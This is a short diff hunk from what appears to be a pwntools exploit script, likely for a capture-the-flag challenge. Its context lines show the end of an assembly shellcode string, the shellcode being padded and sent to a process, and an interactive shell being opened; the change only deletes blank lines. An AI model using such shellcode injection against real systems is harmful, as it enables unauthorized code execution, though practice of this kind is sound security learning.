@@ -28,7 +28,5 @@ mov rdi, rsp
 syscall 
 '''
 
-
-
 p.send(asm(shellcode).ljust(0x100,b'\0'))
 p.interactive()
